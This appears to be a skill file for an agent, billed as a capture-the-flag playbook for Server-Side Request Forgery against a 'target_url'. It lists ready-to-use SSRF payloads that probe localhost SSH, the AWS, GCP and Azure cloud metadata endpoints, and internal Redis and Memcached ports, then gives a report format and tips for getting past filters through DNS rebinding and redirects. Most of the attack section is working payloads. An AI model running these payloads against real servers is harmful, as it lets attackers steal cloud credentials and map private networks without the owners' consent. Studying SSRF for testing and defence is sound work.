---
name: ctf-web-ssrf
description: Server-Side Request Forgery (SSRF) detection and exploitation
tags: [web, ssrf, server-side, injection]
prerequisites: [target_url]
---

# CTF Web - SSRF Exploitation

## When to Use
Use for:
- Accessing internal services
- Scanning internal network
- Reading cloud metadata
- Bypassing firewall rules

## Decision Framework
1. Identify URL parameters
2. Test for internal access
3. Probe cloud metadata
4. Scan internal services

## Execution Steps

### Step 1: Detection
```
http://target.com/fetch?url=http://127.0.0.1:22
```

### Step 2: Cloud Metadata
```
# AWS
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# GCP
http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/

# Azure
http://target.com/fetch?url=http://169.254.169.254/metadata/instance
```

### Step 3: Internal Scanning
```
http://target.com/fetch?url=http://192.168.1.1:80
http://target.com/fetch?url=http://localhost:6379  # Redis
http://target.com/fetch?url=http://localhost:11211 # Memcached
```

## Expected Output Format
```
SSRF Analysis:
  - Vulnerable: Yes
  - Internal Access: Achieved
  - Cloud Metadata: Found
  - Services Discovered: SSH, Redis
```

## Common Pitfalls
- URL filters may block IPs
- Some protocols may be blocked
- DNS rebinding may be needed
- Always check for redirects
